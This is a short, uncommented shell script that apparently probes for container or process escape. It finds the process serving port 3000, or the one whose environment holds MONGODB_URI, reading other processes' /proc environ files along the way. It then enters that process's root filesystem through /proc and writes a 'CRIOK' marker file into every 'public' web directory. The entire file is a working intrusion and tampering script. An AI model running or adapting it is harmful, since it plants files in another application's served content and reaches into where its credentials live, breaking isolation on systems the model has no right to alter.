#!/bin/sh
ino=$(awk '$2 ~ /:0BB8$/ && $4 == "0A" {print $10; exit}' /proc/net/tcp 2>/dev/null)
p=''
if [ -n "$ino" ]; then
  for fd in /proc/[0-9]*/fd/*; do
    [ "$(readlink "$fd" 2>/dev/null)" = "socket:[$ino]" ] && { p=${fd#/proc/}; p=${p%%/*}; break; }
  done
fi
[ -n "$p" ] || for f in /proc/[0-9]*/environ; do grep -aq MONGODB_URI "$f" 2>/dev/null && { p=${f#/proc/}; p=${p%%/*}; break; }; done
[ -n "$p" ] || exit 0
R=/proc/$p/root
for d in $(find "$R" -maxdepth 6 -type d -name public 2>/dev/null); do
  echo CRIOK > "$d/zzz9.txt" 2>/dev/null
done
